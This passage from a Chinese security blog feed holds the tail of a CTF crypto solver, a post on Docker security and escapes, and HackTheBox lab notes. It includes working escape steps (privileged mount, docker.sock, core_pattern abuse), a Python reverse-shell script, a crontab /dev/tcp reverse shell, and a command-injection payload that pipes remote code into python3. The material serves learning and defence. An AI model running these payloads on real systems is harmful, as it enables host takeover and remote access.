sum_AP, modA = dl(encP, P, E1o, sAP) sum_AQ, modB = dl(encQ, Q, E2o, sAQ) mA = sum_AP * pow(sAP, -1, modA) % modA mB = sum_AQ * pow(sAQ, -1, modB) % modB # print(mA, modA) # print(mB, modB) try: m = crt([mA, mB], [modA, modB]) return m, lcm(modA, modB) except: print('FUCK') return (mA, modA) if modA &gt; modB else (mB, modB)if __name__ == '__main__': flags = [] modulos = [] for _ in trange(1000): res = main() if res is not None: if res[0] is not None and res[1] is not None: flags.append(int(res[0])) modulos.append(int(res[1])) print(&quot;flags =&quot;, flags) print(&quot;modulos =&quot;, modulos) lst = list(zip(flags, modulos)) result = [] for i in range(2, len(lst)+1): for combo in itertools.combinations(lst, i): result.append(list(combo)) for combo in result: f, m = map(list, zip(*combo)) try: flag = long_to_bytes(crt(f, m)) if flag.startswith(b'flag'): print(flag) exit() except Exception as e: # print(e) pass 参考https://hasegawaazusa.github.io/ecc-note.html","link":"/2025/03/22/2025%20%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%20-%20Crypto/"},{"title":"Docker 安全问题浅析","text":"学习一下常用的逃逸手法，以及如何设计一个安全的方案。 前言自从听说 Docker 给 root 会导致安全风险，潜意识就觉得 Docker 里的 root 和宿主机的 root 是一回事，但是被问到的时候面试官又说特权模式才会有风险，特权用户无所吊谓，不然 Namespaces 干嘛的呢？ 前置知识UID &amp; GID我们知道，Linux 通过 UID 来标识用户，且 UID 是唯一的，UID 为 0 的用户是 root 用户。可以通过 /etc/passwd 文件来查看用户信息，格式如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051kali@cverc:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:102:105::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsyslog:x:104:111::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:113:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:116::/run/uuidd:/usr/sbin/nologinsystemd-oom:x:108:117:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologintcpdump:x:109:118::/nonexistent:/usr/sbin/nologinavahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologinusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologindnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinkernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologinavahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologincups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologinrtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologinwhoopsie:x:117:124::/nonexistent:/bin/falsesssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologinspeech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/falsefwupd-refresh:x:120:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologinnm-openvpn:x:121:127:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologinsaned:x:122:129::/var/lib/saned:/usr/sbin/nologincolord:x:123:130:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclue:x:124:131::/var/lib/geoclue:/usr/sbin/nologinpulse:x:125:132:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologingnome-initial-setup:x:126:65534::/run/gnome-initial-setup/:/bin/falsehplip:x:127:7:HPLIP system user,,,:/run/hplip:/bin/falsegdm:x:128:134:Gnome Display Manager:/var/lib/gdm3:/bin/falsekali:x:1000:1000:kali,,,:/home/kali:/bin/bashsshd:x:129:65534::/run/sshd:/usr/sbin/nologinftp:x:130:138:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 可以看到，用户分为如下几类： Root 用户：UID 为 0，拥有最高权限。 系统用户：UID 通常为 1-999（不同系统范围可能不同），用于运行系统服务（如 www-data、mysql）。 普通用户：UID 从 1000 或 10000 开始分配（依系统而定），供普通用户使用（如上面的 kali）。 文件/进程的访问权限都是基于 UID 进行判断的，进程在运行时会继承启动用户的 UID，决定其资源访问范围。当然有特殊情况——那就是 setuid。进程的 UID 其实还细分为 RUID（Real UID）和 EUID（Effective UID），前者是进程实际所有者的 UID，后者则决定进程权限，这就是 SUID（Set User ID） 机制。刚好发现 WSL 的 ping 坏了（虽然我也不确实是不是一直都这样），具体表现就是没权限，详细如下： 1234$ ping baidu.comping: socktype: SOCK_RAWping: socket: Operation not permittedping: =&gt; missing cap_net_raw+p capability or setuid? 前几次都忍了，加个 sudo 也能用，但是今天既然都写到这就干脆修一下 12$ ls -l /usr/bin/ping-rwxr-xr-x 1 root root 156136 Sep 25 2024 /usr/bin/ping 执行 sudo chmod u+s /usr/bin/ping，再看： 1-rwsr-xr-x 1 root root 156136 Sep 25 2024 /usr/bin/ping 可以看到多了个 s，即 SUID 的标志位，运行时会将 EUID 设置为文件所有者的 UID（即 root），就可以畅快地 ping 了。 值得一提的是，对于脚本文件（如 .sh），SUID 是无效的，只有二进制文件才有效，这也是 Linux 的安全设计，之前做渗透的时候踩过坑。 做渗透测试的时候也可以用 find / -perm -4000 命令查找 SUID 文件，利用它们来提权。日常的生产实践还是优先使用 sudo 或者 Capabilities 机制来控制权限，SUID 只在必要时使用。 NamespacesDocker 有三大核心机制： Namespaces：隔离进程空间 Cgroups：限制资源使用 UnionFS：分层文件系统 那么其中 Namespaces 其实是有很多种的： Pid Namespaces：进程 ID 隔离 UTS Namespaces：主机名隔离 Mount Namespaces：挂载点隔离 IPC Namespaces：进程间通信隔离 Network Namespaces：网络隔离 接下来的就是我们今天的主角：User Namespaces，用户隔离。 User NamespacesUser Namespaces 是 Linux 内核提供的一种隔离机制，可以将容器内的用户 ID 映射到宿主机的用户 ID，从而实现用户层面的隔离。但是，这个 User Namespaces 不是默认开启的，需要在 Docker 的配置文件中进行设置。也就是说，默认情况下，Docker 里的 root 跟宿主机的 root 就是一回事，被面试官忽悠了，绷。 以下文提到的挂载 procfs 逃逸为例，没开 User Namespaces 的情况下，宿主机的 root 直接就被拿下了。 Docker 逃逸特权模式emmmm 感觉没什么好解释的，顾明思义已经是特权模式了，想干嘛都行。 先启动一个特权模式的容器 1docker run --rm --privileged=true -it alpine 执行如下命令检测一下 1cat /proc/self/status | grep CapEff 若为 0000003fffffffff 或 0000001fffffffff，则表示为特权模式，拥有所有的 Capabilities 查看一下挂载磁盘设备 1fdisk -l 吔？好像结果跟别人说的不太一样 1234567891011121314151617181920212223242526272829303132333435363738# fdisk -lDisk /dev/fd0: 1 MB, 1474560 bytes, 2880 sectors1 cylinders, 145 heads, 16 sectors/trackUnits: sectors of 1 * 512 = 512 bytesDevice Boot StartCHS EndCHS StartLBA EndLBA Sectors Size Id Type/dev/fd0p1 90 656,144,16 656,144,16 2425393296 555819295 2425393296 1156G 90 UnknownPartition 1 has different physical/logical start (non-Linux?): phys=(656,144,16) logical=(1045428,21,1)Partition 1 has different physical/logical end: phys=(656,144,16) logical=(239577,40,16)/dev/fd0p2 90 656,144,16 656,144,16 2425393296 555819295 2425393296 1156G 90 UnknownPartition 2 has different physical/logical start (non-Linux?): phys=(656,144,16) logical=(1045428,21,1)Partition 2 has different physical/logical end: phys=(656,144,16) logical=(239577,40,16)/dev/fd0p3 90 656,144,16 656,144,16 2425393296 555819295 2425393296 1156G 90 UnknownPartition 3 has different physical/logical start (non-Linux?): phys=(656,144,16) logical=(1045428,21,1)Partition 3 has different physical/logical end: phys=(656,144,16) logical=(239577,40,16)/dev/fd0p4 90 656,144,16 656,144,16 2425393296 555819295 2425393296 1156G 90 UnknownPartition 4 has different physical/logical start (non-Linux?): phys=(656,144,16) logical=(1045428,21,1)Partition 4 has different physical/logical end: phys=(656,144,16) logical=(239577,40,16)Found valid GPT with protective MBR; using GPTDisk /dev/sda: 41943040 sectors, 0Logical sector size: 512Disk identifier (GUID): 247954d6-7c12-4470-9429-09ba67b1bfc5Partition table holds up to 128 entriesFirst usable sector is 34, last usable sector is 41943006Number Start (sector) End (sector) Size Name 1 2048 4095 1024K 2 4096 1054719 513M EFI System Partition 3 1054720 41940991 19.4G 应该是虚拟机导致的。 尝试了下，上面那几个奇怪的玩意实际是不存在的，然后一直试到 /dev/sda3 就挂载上了 1mount /dev/sda3 /mnt 此时宿主机的根目录就挂载上去了，cd 进去再 chroot . 即可。当然写 crontab 挂一个反弹 shell 也可以。 挂载 Docker SocketDocker Socket 是 Docker 的一个 Unix Socket 文件，默认路径为 /var/run/docker.sock，它允许用户通过 Docker CLI 与 Docker 守护进程进行通信。 创建一个容器并挂载 Docker Socket 1docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu 容器里面安装一下 Docker 1234docker exec -it with_docker_sock /bin/bashapt-get updateapt-get install curl -ycurl -fsSL https://get.docker.com/ | sh 查看是否存在 Docker Socket 1ls -lah /var/run/docker.sock 若存在则说明这个漏洞可能存在，创建一个容器并挂载宿主机的根目录即可 1docker run -it -v /:/mnt/ ubuntu 然后还是 cd /mnt 进去，chroot . 就逃逸出来了。 原理也很简单，我们现在 review 一下 Docker 启动一个容器的流程： 命令行解析：Docker CLI 解析用户输入的命令行参数。 API 调用：Docker CLI 通过 HTTP API 调用 Docker 守护进程。 Dockerd 处理请求：Docker 守护进程接收请求并解析参数。 Containerd 和 runc：Docker 守护进程将请求传递给 containerd，containerd 负责容器的生命周期管理。runc 是一个低级别的容器运行时，负责创建和管理容器的命名空间、cgroups 等。 注意到上面加粗的文字，没错，就是在那里，Docker Socket 实际上是一个 Unix Socket 文件，Docker 守护进程通过这个文件接收来自 Docker CLI 的请求。 那就不难理解了，你把 Docker Socket 挂载到容器里，容器与这个 Socket 文件通信时，实际上是与宿主机的 Docker 守护进程通信，也就能随便操控宿主机的资源了。 挂载 procfs创建一个容器并挂载 /proc 目录 1docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 看看有没有两个 core_pattern 文件 123find / -name core_pattern/proc/sys/kernel/core_pattern/host/proc/sys/kernel/core_pattern 找到当前容器在宿主机下的绝对路径 12cat /proc/mounts | xargs -d ',' -n 1 | grep workdirworkdir=/var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/work 这里说一下 xargs 命令，-d 选项指定分隔符，-n 选项指定每次传递给命令的参数个数。如此其实也可以用如下命令只输出目录 1cat /proc/mounts | xargs -d ',' -n 1 | grep workdir | xargs -d &quot;=&quot; | awk '{print $2}' 意思就是当前容器挂载在宿主机的 /var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/merged 目录下，去宿主机 ls 一下也可以确认 然后找个位置写一个反弹 shell 的脚本，我这里选择写在 /tmp/t.py 1234567891011121314151617#!/usr/bin/python3import osimport ptyimport socketlhost = &quot;&lt;your_host_ip&gt;&quot;lport = &lt;your_host_port&gt;def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(&quot;HISTFILE&quot;, '/dev/null') pty.spawn(&quot;/bin/bash&quot;) s.close()if __name__ == &quot;__main__&quot;: main() 加上执行权限（别忘了！！！） 1chmod +x /tmp/t.py 写到宿主机的 /proc 目录下 1echo -e &quot;|/var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/merged/tmp/t.py \\rcore &quot; &gt; /host/proc/sys/kernel/core_pattern 写一个可以触发 core dump 的程序 123456#include&lt;stdio.h&gt;int main(void) { int *a = NULL; *a = 1; return 0;} 编译一下，执行 12gcc t.c -o t./t 记得在攻击机上开启监听 1nc -lvnp &lt;your_host_port&gt; 宿主机 root 的 shell 就弹出来了。 现在说说原理：Linux 有一个核心转储（core dump）机制（这中文听着怪怪的哈），当进程崩溃时，内核会将进程的内存映像保存到一个文件，用于调试。 而 /proc/sys/kernel/core_pattern 定义了核心转储文件的生成规则。其格式分为： 静态路径：如 /var/crash/core.%p（%p 表示进程 PID）。 管道命令：以 | 开头时，内核会将 core dump 内容通过管道传递给指定程序，格式为：| /path/to/program %p [其他参数] 相信这时候你也看出来了，上面的利用方式实际上是将 core dump 的内容作为参数传递给了 /tmp/t.py，而 /tmp/t.py 被 root 执行，从而反弹出 shell。 拓展之 OverlayFS我们知道 Docker 三大核心机制之一是 UnionFS，Docker 采用的是 OverlayFS。先说 UnionFS，其核心思想就是分层叠加，类似“多层透明纸叠加”的效果，每张纸画不同的内容，叠加在一起就形成了一个完整的图像。OverlayFS 则是 Linux 内核提供的一种 UnionFS 的具体实现。OverlayFS 需要四个目录： lowerdir（下层目录）：只读的基础层（如 Docker 镜像）。 upperdir（上层目录）：可写层，存放修改后的文件。 merged（合并目录）：最终用户看到的统一视图，合并了上下层内容。 workdir（工作目录）：系统内部用于处理文件操作（如临时存放复制的文件）。 读取文件时，若文件在 upperdir 中存在，则读取 upperdir 中的文件；否则读取 lowerdir 中的文件。修改 lowerdir 中的文件时，会触发写时复制（Copy-on-Write）机制，将文件复制到 upperdir 中进行修改，原文件保持不变删除文件时，会在 upperdir 中标记一个“删除白板”，隐藏下层文件。最终效果：通过 merged 目录，用户可以看到一个合并后的完整的文件系统视图，原始基础镜像（lowerdir）始终不变。 注意到上面提到的写时复制，这是应用非常广泛的一种设计模式。可以概括出如下优点： 高效：无需复制整个基础层，只有修改时才复制单个文件。 节省空间：多个容器可以共享同一基础层，避免重复存储。 快速启动：创建新容器时，只需创建新的 upperdir 和 workdir，而不需要复制整个文件系统。 现在我们可以瞄一眼文件系统中的实际结构： 12ls /var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49diff link lower merged work diff 是一个目录，对应 upperdir，ls 一下可以看到里面是一个不完整的容器的根目录，只包含我们修改过的文件。link 是一个文件，存储该层的“短名称”（缩短的哈希值），用于简化目录引用，先不管他。 12cat linkWKXKCJ67B3V6VZNJ7GP4REARER lower 是一个文件，对应 lowerdir，记录该层的下层目录的哈希值，也待会再说 12cat lowerl/5MMEIBNIEE5KXKNNZLRXW6U2YA:l/JVXDIO6M3RVT6N6O2ETGZQ5IY4 merged 是一个目录，即最终的合并视图，ls 看到的东西跟在容器里 ls /是一样的。work 是一个目录，作为处理文件操作的临时工作区，在复制、删除或修改时，系统在这里完成原子操作，确保数据一致性，由 OverlayFS 自动管理。 现在我们再看一下那几个短哈希值 1234ls /var/lib/docker/overlay2/l -allrwxrwxrwx 1 root root 77 4月 10 21:58 5MMEIBNIEE5KXKNNZLRXW6U2YA -&gt; ../0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49-init/difflrwxrwxrwx 1 root root 72 4月 10 21:58 WKXKCJ67B3V6VZNJ7GP4REARER -&gt; ../0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/difflrwxrwxrwx 1 root root 72 3月 20 15:05 JVXDIO6M3RVT6N6O2ETGZQ5IY4 -&gt; ../78e27d8316131fb2b18adb91fd994cbe73436ed1685123f9e38ab7d36c4b7f52/diff 可以看到 WKXKCJ67B3V6VZNJ7GP4REARER 作为当前层，里面是有我们在容器里创建的文件的，5MMEIBNIEE5KXKNNZLRXW6U2YA 与 JVXDIO6M3RVT6N6O2ETGZQ5IY4 属于基础镜像层或者装 Python 之类的依赖后的层，里面的文件就比较朴素。 最终视图可以理解成这样 1234容器视图（merged）├── 可写层（diff） ← 容器运行时修改的文件├── 层2（Python 安装） ← l/JVXDIO6M3RVT6N6O2ETGZQ5IY4└── 层1（Ubuntu 系统） ← l/5MMEIBNIEE5KXKNNZLRXW6U2YA 挂载宿主机根目录看过上文的读者应该对这个没什么疑问了，这个就是上面提到的攻击路径的最后一环，如特权模式、挂载 Docker Socket 等等，都是为了获取宿主机的根目录的访问权限，方法上就是挂载宿主机的根目录到容器里。 环境搭建命令如下： 1docker run -it -v /:/mnt/ ubuntu cd 进去，chroot . 就可以了，crontab 也可以，上文多次提到，不再赘述。 Docker remote api 未授权访问将 Dockerd 的监听设在 2375 端口： 123sudo dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375INFO[2025-04-22T10:39:23.909818793+08:00] Starting upfailed to start daemon, ensure docker is not running or delete /var/run/docker.pid: process with PID 1319 is still running 意思是要先关掉 Docker 1sudo systemctl stop docker 再来 12345678910111213141516171819202122sudo dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375INFO[2025-04-22T10:40:38.151876920+08:00] Starting upWARN[2025-04-22T10:40:38.152530906+08:00] Binding to IP address without --tlsverify is insecure and gives root access on this machine to everyone who has access to your network. host=&quot;tcp://0.0.0.0:2375&quot;WARN[2025-04-22T10:40:38.152554700+08:00] Binding to an IP address, even on localhost, can also give access to scripts run in a browser. Be safe out there! host=&quot;tcp://0.0.0.0:2375&quot;WARN[2025-04-22T10:40:38.152609238+08:00] [DEPRECATION NOTICE] In future versions this will be a hard failure preventing the daemon from starting! Learn more at: https://docs.docker.com/go/api-security/ host=&quot;tcp://0.0.0.0:2375&quot;WARN[2025-04-22T10:40:39.154871410+08:00] Binding to an IP address without --tlsverify is deprecated. Startup is intentionally being slowed down to show this message host=&quot;tcp://0.0.0.0:2375&quot;WARN[2025-04-22T10:40:39.154978953+08:00] Please consider generating tls certificates with client validation to prevent exposing unauthenticated root access to your network host=&quot;tcp://0.0.0.0:2375&quot;WARN[2025-04-22T10:40:39.155023761+08:00] You can override this by explicitly specifying '--tls=false' or '--tlsverify=false' host=&quot;tcp://0.0.0.0:2375&quot;WARN[2025-04-22T10:40:39.155038038+08:00] Support for listening on TCP without authentication or explicit intent to run without authentication will be removed in the next release host=&quot;tcp://0.0.0.0:2375&quot;INFO[2025-04-22T10:40:54.210520545+08:00] detected 127.0.0.53 nameserver, assuming systemd-resolved, so using resolv.conf: /run/systemd/resolve/resolv.confINFO[2025-04-22T10:40:54.447847216+08:00] [graphdriver] using prior storage driver: overlay2INFO[2025-04-22T10:40:54.463550314+08:00] Loading containers: start.INFO[2025-04-22T10:40:54.986964216+08:00] Default bridge (docker0) is assigned with an IP address 172.17.0.0/16. Daemon option --bip can be used to set a preferred IP addressINFO[2025-04-22T10:40:55.090980115+08:00] Loading containers: done.WARN[2025-04-22T10:40:55.145707727+08:00] [DEPRECATION NOTICE]: API is accessible on http://0.0.0.0:2375 without encryption. Access to the remote API is equivalent to root access on the host. Refer to the 'Docker daemon attack surface' section in the documentation for more information: https://docs.docker.com/go/attack-surface/In future versions this will be a hard failure preventing the daemon from starting! Learn more at: https://docs.docker.com/go/api-security/INFO[2025-04-22T10:40:55.145782627+08:00] Docker daemon commit=&quot;26.1.3-0ubuntu1~22.04.1&quot; containerd-snapshotter=false storage-driver=overlay2 version=26.1.3INFO[2025-04-22T10:40:55.145947337+08:00] Daemon has completed initializationINFO[2025-04-22T10:40:55.236241515+08:00] API listen on /var/run/doc 可以看到输出中已经对安全性作了警告 在局域网中 wget 一下这个 IP:2375，若返回 404，则说明可能存在漏洞 123IP=&lt;your_host_ip&gt;curl http://$IP:2375/containers/json # 列出容器信息docker -H tcp://$IP:2375 ps -a # 查看容器 攻击手法也是类似的，创建一个容器并挂载宿主机的根目录 1docker -H tcp://$IP:2375 run -it -v /:/mnt/ ubuntu 依然 cd chroot 一把梭，抑或反弹 shell： 1echo '* * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1' &gt;&gt; /mnt/var/spool/cron/crontabs/root 如何设计一个安全的容器方案安全隐患 未知攻，焉知防？ 先说说 Docker 的安全隐患，唠一唠车轱辘话。Docker 的安全隐患主要分为三类： 宿主机的操作系统本身就存在安全隐患 我们知道，Docker 跟宿主机是共享内核的，所以如果宿主机的内核存在漏洞，那么 Docker 也会受到影响。比如著名的脏牛提权漏洞（CVE-2016-5195）。 容器自身的安全问题 滥用 Docker API 攻击 Docker 逃逸攻击 容器间通信的风险 容器配置不当引起的安全问题 容器镜像安全问题 无法检测安全性 不安全的镜像源 安全防护容器的安全防护应该从容器的整个生命周期来考虑，包括一个容器镜像从创建、传输、运行到停止的全过程。 创建阶段 代码审计 可信基础镜像 容器镜像加固 容器镜像扫描 基础镜像安全管理 传输阶段 镜像签名 用户访问控制 支持 HTTPS 的镜像仓库 运行阶段 对容器主机进行加固 容器安全配置 容器隔离 容器安全监控与审计 容器安全防护与入侵检测 容器运行时的漏洞扫描 网络安全防护 参考Isolate containers with a user NamespacesDocker 魔法解密：探索 UnionFS 与 OverlayFST Wiki","link":"/2025/04/03/Docker%20%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%B5%85%E6%9E%90/"},{"title":"HackTheBox 笔记 - 1","text":"不得不找饭吃了。Two Million / Mailing / BoardLight / Usage 配置国内访问比较慢，生成 VPN 的时候选 TCP，然后在下载的 .ovpn 文件里加一行 http-proxy ip:port，再用 openvpn 连接就行了，快很多。 新手村四道基础题，基本就是 nmap 扫。主要记住一些参数，比如 -p- 扫描所有端口，--min-rate &lt;num&gt; 设置扫描速率，-n 不解析域名，-sS SYN 扫描，-Pn 不 ping 主机，--open 只显示开放端口，--stats-every &lt;num&gt; 每扫描多少个端口显示一次统计信息，-vv 详细输出。 Two Million扫出来两个端口，一个是 80，一个是 22。 访问 80 端口，301 到 2million.htb，改 etc/host 加一行 10.10.11.221 2million.htb，再访问，发现是个登录页面。根据提示找到 inviteapi.min.js，内容如下： 123456789101112131415161718192021222324252627282930313233343536eval( function (p, a, c, k, e, d) { e = function (c) { return c.toString(36) }; if (!''.replace(/^/, String)) { while (c--) { d[c.toString(a)] = k[c] || c.toString(a) } k = [ function (e) { return d[e] } ]; e = function () { return '\\\\w+' }; c = 1 }; while (c--) { if (k[c]) { p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c]) } } return p }( '1 i(4){h 8={&quot;4&quot;:4};$.9({a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:&quot;7&quot;,5:&quot;6&quot;,b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, { } )) 打开 de4js 去混淆得到： 12345678910111213141516171819202122232425262728293031function verifyInviteCode(code) { var formData = { &quot;code&quot;: code }; $.ajax({ type: &quot;POST&quot;, dataType: &quot;json&quot;, data: formData, url: '/api/v1/invite/verify', success: function (response) { console.log(response) }, error: function (response) { console.log(response) } })}function makeInviteCode() { $.ajax({ type: &quot;POST&quot;, dataType: &quot;json&quot;, url: '/api/v1/invite/how/to/generate', success: function (response) { console.log(response) }, error: function (response) { console.log(response) } })} 执行 1curl http://2million.htb/api/v1/invite/how/to/generate -X POST 得到 1{&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;data&quot;:&quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr&quot;,&quot;enctype&quot;:&quot;ROT13&quot;},&quot;hint&quot;:&quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;} 直接 CyberChef 解 ROT13 得到 In order to generate the invite code, make a POST request to /api/v1/invite/generate。好吧，改个 PATH，再 POST 一下，得到 1{&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;code&quot;:&quot;QUtZOEYtMENKMzMtSEE5OVEtS1VHTzQ=&quot;,&quot;format&quot;:&quot;encoded&quot;}} 解码得到 PBBOO-D9FOB-9BVZP-KCGHW，不知道为什么 POST 到 /api/v1/invite/verify 的结果是 invalid。不管。 注册登录后，顺着提示点击 Connection Pack，下载链接为 /api/v1/user/vpn/generate。访问 /api/v1，得到一堆 API。 123456789101112131415161718192021v1 user GET /api/v1 &quot;Route List&quot; /api/v1/invite/how/to/generate &quot;Instructions on invite code generation&quot; /api/v1/invite/generate &quot;Generate invite code&quot; /api/v1/invite/verify &quot;Verify invite code&quot; /api/v1/user/auth &quot;Check if user is authenticated&quot; /api/v1/user/vpn/generate &quot;Generate a new VPN configuration&quot; /api/v1/user/vpn/regenerate &quot;Regenerate VPN configuration&quot; /api/v1/user/vpn/download &quot;Download OVPN file&quot; POST /api/v1/user/register &quot;Register a new user&quot; /api/v1/user/login &quot;Login with existing user&quot; admin GET /api/v1/admin/auth &quot;Check if user is admin&quot; POST /api/v1/admin/vpn/generate &quot;Generate VPN for specific user&quot; PUT /api/v1/admin/settings/update &quot;Update user settings&quot; 发现 /api/v1/admin/settings/update 能改管理员身份，传一个 1234{ &quot;email&quot;: &quot;a@a.com&quot;, &quot;is_admin&quot;:1} 就能把自己改成 admin。 对 /api/v1/admin/vpn/generate 进行命令注入： 123{&quot;username&quot;: &quot;abc;curl 10.10.14.20:5555/rshell.py | python3;ls&quot;} 把 shell 弹出来。cat .env 看到 1234DB_HOST=127.0.0.1DB_DATABASE=htb_prodDB_USERNAME=adminDB_PASSWORD=SuperDuperPass123 连一下数据库 1mysql --user admin --password htb_prod 发现里面没啥有用的，用数据库的密码试一下 ssh，发现密码是相同的。于是登上 admin，然后读 user.txt 拿到第一个 flag。 然后根据提示找到 /var/mail/admin，里面说 OverlayFS 有 CVE，定位到 CVE-2023-0386。 用这个 PoC 打一下就行了。后面题目问 GLIBC 版本，执行 ldd --version 即可。 还留下了一个 CVE-2023-4911，有空再看。 CVE-2023-0386下面来详细分析一下这个 CVE。 FUSEFUSE(Filesystem in Userspace) MailingVMWare 的 Kali GUI 崩了，登录完直接黑屏，我之前也忘了存个快照，于是现在就采用纯命令行 + 代理转发的形式用，反正 GUI 里也只图个 Browser 和 Burpsuite。 还是用的 squid，squid.conf 按下面配置，再重启一下服务就行。 1234acl all src allhttp_access allow allhosts_file /etc/hostshttp_port 3128 Burpsuite 里 settings -&gt; Network -&gt; Connection -&gt; Upstream Proxy Servers，设置好代理，然后就能用了。nmap 一扫发现一堆端口，基本都是邮件服务相关，结果如下： 123456789101112131415161718192021PORT STATE SERVICE25/tcp open smtp80/tcp open http110/tcp open pop3135/tcp open msrpc139/tcp open netbios-ssn143/tcp open imap445/tcp open microsoft-ds465/tcp open smtps587/tcp open submission993/tcp open imaps5040/tcp open unknown5985/tcp open wsman7680/tcp open pando-pub47001/tcp open winrm49664/tcp open unknown49665/tcp open unknown49666/tcp open unknown49667/tcp open unknown49668/tcp open unknown50304/tcp open unknown dirsearch 扫出 /assets/ 和 /download.php。/assets/ 存着一些图片，/download.php 可以任意文件读。由前面扫到的端口可知这是一个 hMailServer，所以可以直接读 hMailServer.INI。?file=../../../../../../../../../Program%20Files%20(x86)/hMailServer/Bin/hMailServer.INI 读出如下内容： 1234567891011121314151617181920[Directories]ProgramFolder=C:\\Program Files (x86)\\hMailServerDatabaseFolder=C:\\Program Files (x86)\\hMailServer\\DatabaseDataFolder=C:\\Program Files (x86)\\hMailServer\\DataLogFolder=C:\\Program Files (x86)\\hMailServer\\LogsTempFolder=C:\\Program Files (x86)\\hMailServer\\TempEventFolder=C:\\Program Files (x86)\\hMailServer\\Events[GUILanguages]ValidLanguages=english,swedish[Security]AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7[Database]Type=MSSQLCEUsername=Password=0a9f8ad8bf896b501dde74f08efd7e4cPasswordEncryption=1Port=0Server=Database=hMailServerInternal=1 admin 的密码 hash 为 841bb5acfa6779ae432fd7a4e6600ba7，用 hash-identifier 判断是 MD5，用在线网站解密得到 homenetworkingadministrator。 md5 在线解密的网站有 Hashes，crackstation 等。 用 CVE-2024-21413 打，参考这篇文章，先启动 NTLM 监听 1sudo impacket-smbserver -smb2support -ip 0.0.0.0 test /tmp 再用 PoC 打 1python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url 